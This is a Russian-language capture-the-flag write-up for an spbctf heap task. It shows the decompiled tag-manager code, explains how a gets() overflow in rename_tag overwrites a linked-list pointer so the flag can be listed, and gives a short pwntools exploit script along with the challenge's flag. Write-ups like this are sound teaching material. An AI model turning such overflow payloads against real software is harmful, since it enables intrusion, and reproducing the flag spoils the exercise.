[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_mc3)
Описание:
Pwn the tag manager to read the flag from memory
`nc 109.233.56.90 11713`
**[mc3.elf](https://pwn.spbctf.ru/files/heap/mc3/mc3.elf)**

``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *f; // [rsp+8h] [rbp-18h]
  char choice[4]; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  f = fopen("flag.txt", "rb");

  if ( f )
  {
    fgets(FLAG, 128, f);
    fclose(f);
    while ( 1 )
    {
      puts("\nMENU");
      puts("l - list all tags");
      puts("n - new tag");
      puts("r - rename tag");
      puts("d - delete tag");
      printf("choice: ");
      alarm(0x78u);
      if ( (unsigned int)__isoc99_scanf("%1s%*c", choice) != 1 )
        break;
      switch ( choice[0] )
      {
        case 'l':
          list_tags();
          break;
        case 'n':
          new_tag();
          break;
        case 'r':
          rename_tag();
          break;
        case 'd':
          delete_tag();
          break;
      }
    }
    return 0;
  }
  else
  {
    puts("Couldn't open flag.txt");
    return 1;
  }
}

void __cdecl list_tags()
{
  int count; // [rsp+4h] [rbp-Ch]
  node *cur; // [rsp+8h] [rbp-8h]

  cur = HEAD;
  puts("LISTING:");
  count = 0;
  while ( cur )
  {
    printf("- %s\n", cur->tag);
    cur = cur->next;
    ++count;
  }
  printf(" (total %d)\n", count);
}

void __cdecl new_tag()
{
  node *v0; // [rsp+8h] [rbp-8h]

  v0 = (node *)malloc(8u);
  v0->next = HEAD;
  HEAD = v0;
  printf("New tag label: ");
  gets(v0->tag);
}

void __cdecl rename_tag()
{
  node *cur; // [rsp+8h] [rbp-28h]
  char search[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("What label to change: ");
  gets(search);
  for ( cur = HEAD; cur && strcmp(cur->tag, search); cur = cur->next )
    ;
  if ( cur )
  {
    printf("New label for the tag: ");
    gets(cur->tag);
  }
  else
  {
    puts("Not found");
  }
}

void __cdecl delete_tag()
{
  node *cur; // [rsp+0h] [rbp-30h]
  node *tmp; // [rsp+8h] [rbp-28h]
  node *tmpa; // [rsp+8h] [rbp-28h]
  char search[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("What label to delete: ");
  gets(search);
  if ( !strcmp(HEAD->tag, search) )
  {
    tmp = HEAD;
    HEAD = HEAD->next;
    free(tmp);
  }
  else
  {
    for ( cur = HEAD; cur->next; cur = cur->next )
    {
      if ( !strcmp(cur->next->tag, search) )
      {
        tmpa = cur->next;
        cur->next = cur->next->next;
        free(tmpa);
        return;
      }
    }
    puts("Not found");
  }
}
```

node - это связный список, если переписать ссылку с следующего элемента на адрес флага, то можно прочитать флаг в функции `list_tags`.
``` C
00000000 struct node // sizeof=0x18
00000000 {
00000000     node *next;
00000008     char tag[16];
00000018 };
```
Перезаписать можно в функции `rename_tag`, переполнил массив `tag[16]`.

Ход эксплуатации:
- Создать 2 элемента списка;
- Переименовать первый, при этом переполнив буфер и переписал ссылку на следующий элемент после второго на флаг;
- `list_tags()`

Эксплоит:
``` python
flag_addr = 0x6020E0

io = start()

io.sendlineafter(b': ', b'n')
io.sendlineafter(b': ', b'a')
io.sendlineafter(b': ', b'n')
io.sendlineafter(b': ', b'b')

io.sendlineafter(b': ', b'r')
io.sendlineafter(b': ', b'a')
payload = b'a' * 16 + b'its_head' + p64(flag_addr-8)
io.sendlineafter(b': ', payload)

io.sendlineafter(b': ', b'l')

io.interactive()
```

Запуск:
![Pasted image 20260415235058](../../../../z.%20Images/Pasted%20image%2020260415235058.png)

Ответ: `spbctf{76663430e4ada95cfc0ac695d81cc66f}`